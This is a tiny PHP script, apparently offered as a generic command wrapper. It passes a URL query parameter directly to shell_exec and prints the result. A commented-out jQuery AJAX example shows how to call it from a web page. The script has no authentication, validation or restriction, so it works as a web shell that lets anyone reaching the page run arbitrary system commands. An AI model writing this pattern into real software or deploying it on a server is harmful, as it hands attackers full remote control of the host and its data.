<?php

$results = shell_exec($_GET["commandstr"]);

if (is_null($results)){
    echo '';
}else{
    echo $results;
}

?>


<!-- Example shell any command wrapper.

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<script>
var commandstr = $("#commandstr").val();
$.ajax({
    url: "shell_exec.php",
    data: { commandstr: commandstr },
    type: "GET",
    success: function (result) {
        $("#search-results").html(result);
    }
});
</script>

Example End -->
